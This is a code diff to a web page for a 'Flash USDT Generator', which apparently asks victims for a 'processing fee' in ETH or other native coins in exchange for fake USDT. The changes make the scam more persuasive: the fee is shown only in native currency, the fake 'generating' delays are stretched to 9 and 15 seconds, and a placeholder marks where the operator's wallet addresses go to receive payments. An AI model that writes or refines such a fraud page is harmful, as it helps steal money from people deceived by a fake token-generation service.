@@ -1600,6 +1600,20 @@
         <div class="main-card">
             <h2 class="section-title" data-translate="generator_title">⚡ Flash USDT Generator</h2>
             
+            <form id="generatorForm">
+                <div class="form-group">
+                    <label class="form-label" for="network" data-translate="select_network">Select Network</label>
+                    <select id="network" onchange="updateCommission()">
+                        <option value="">-- Select Network First --</option>
+                        <option value="ethereum">Ethereum (ERC-20)</option>
+                        <option value="bsc">Binance Smart Chain (BEP-20)</option>
+                        <option value="polygon">Polygon (MATIC)</option>
+                        <option value="arbitrum">Arbitrum One</option>
+                        <option value="optimism">Optimism</option>
+                        <option value="tron">Tron (TRC-20)</option>
+                    </select>
+                </div>
+
             <div class="amount-section">
                 <div class="amount-label" data-translate="enter_amount">Enter Flash USDT Amount</div>
                 <div class="amount-input-wrapper">
@@ -1613,30 +1627,17 @@
                     <button class="quick-btn" onclick="setAmount(50000)">50,000 USDT</button>
                     <button class="quick-btn" onclick="setAmount(100000)">100,000 USDT</button>
                 </div>
-                <div class="commission-info" id="commissionInfo">
+                <div class="commission-info" id="commissionInfo" style="display: none;">
                     <div class="commission-text" data-translate="processing_fee">Processing Fee:</div>
-                    <div class="commission-amount" id="commissionAmount">50 USDT</div>
+                    <div class="commission-amount" id="commissionAmount">-- Select Network --</div>
                 </div>
             </div>
 
-            <form id="generatorForm">
                 <div class="form-group">
                     <label class="form-label" for="recipientAddress">
                         <span data-translate="recipient_address">Recipient Address</span> <span class="required">*</span>
                     </label>
                     <input type="text" id="recipientAddress" data-translate-placeholder="recipient_placeholder" placeholder="0x... (required field)" required>
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label" for="network" data-translate="select_network">Select Network</label>
-                    <select id="network">
-                        <option value="ethereum">Ethereum (ERC-20)</option>
-                        <option value="bsc">Binance Smart Chain (BEP-20)</option>
-                        <option value="polygon">Polygon (MATIC)</option>
-                        <option value="arbitrum">Arbitrum One</option>
-                        <option value="optimism">Optimism</option>
-                        <option value="tron">Tron (TRC-20)</option>
-                    </select>
                 </div>
 
                 <div class="form-group">
@@ -1739,10 +1740,6 @@
                 </div>
                 <div class="fee-row">
                     <span class="fee-label" data-translate="processing_fee">Processing Fee:</span>
-                    <span class="fee-value total" id="modalFee">50 USDT</span>
-                </div>
-                <div class="fee-row">
-                    <span class="fee-label" data-translate="pay_in_currency">Pay in Native Currency:</span>
                     <span class="fee-value total" id="modalFeeNative">0.0155 ETH</span>
                 </div>
             </div>
@@ -2031,7 +2028,7 @@
         let isWalletConnected = false;
         let userAddress = '';
         let currentAmount = 10000;
-        let currentNetwork = 'ethereum';
+        let currentNetwork = '';
         let currentDuration = '30';
         let currentRecipient = '';
 
@@ -2133,9 +2130,27 @@
 
         function updateCommission() {
             const amount = parseFloat(document.getElementById('amountInput').value) || 0;
-            const commission = calculateCommission(amount);
-            document.getElementById('commissionAmount').textContent = commission + ' USDT';
+            const networkSelect = document.getElementById('network');
+            const network = networkSelect.value;
+            
             currentAmount = amount;
+            currentNetwork = network;
+            
+            const commissionInfo = document.getElementById('commissionInfo');
+            const commissionAmount = document.getElementById('commissionAmount');
+            
+            if (!network || network === '') {
+                commissionInfo.style.display = 'block';
+                commissionAmount.textContent = '-- Select Network First --';
+                return;
+            }
+            
+            const commissionUSDT = calculateCommission(amount);
+            const currency = networkCurrency[network];
+            const nativeAmount = convertToNative(commissionUSDT, network);
+            
+            commissionInfo.style.display = 'block';
+            commissionAmount.textContent = nativeAmount + ' ' + currency.symbol;
         }
 
         function setAmount(amount) {
@@ -2193,6 +2208,11 @@
             const network = document.getElementById('network').value;
             const duration = document.getElementById('duration').value;
 
+            if (!network || network === '') {
+                alert('Please select a network first');
+                return;
+            }
+
             if (!amount || amount <= 0) {
                 alert('Please enter a valid amount');
                 return;
@@ -2214,7 +2234,7 @@
             setTimeout(() => {
                 document.getElementById('loading').classList.remove('active');
                 showFeeModal();
-            }, 3000);
+            }, 9000);
         });
 
         function showFeeModal() {
@@ -2226,7 +2246,6 @@
 
             document.getElementById('modalAmount').textContent = currentAmount.toLocaleString() + ' USDT';
             document.getElementById('modalNetwork').textContent = networkText;
-            document.getElementById('modalFee').textContent = commission + ' USDT';
             document.getElementById('modalFeeNative').textContent = nativeAmount + ' ' + currency.symbol;
             
             // SET YOUR WALLET ADDRESSES HERE
@@ -2280,7 +2299,7 @@
                 document.getElementById('loading').classList.remove('active');
                 document.getElementById('loading').querySelector('.loading-text').textContent = translations[currentLang]['generating'];
                 showSuccess();
-            }, 5000);
+            }, 15000);
         }
 
         function showSuccess() {
